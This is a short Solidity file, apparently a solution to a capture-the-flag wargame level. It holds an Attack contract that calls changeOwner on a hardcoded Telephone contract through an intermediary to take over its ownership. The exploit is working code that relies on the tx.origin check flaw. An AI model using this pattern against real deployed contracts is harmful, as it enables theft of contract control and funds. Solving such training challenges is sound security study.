pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack {
    Telephone public telephone;

    constructor() {
        telephone = Telephone(0x45298B3FDb63De443F8B3aE0Ce2816285c5d2Ed1);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
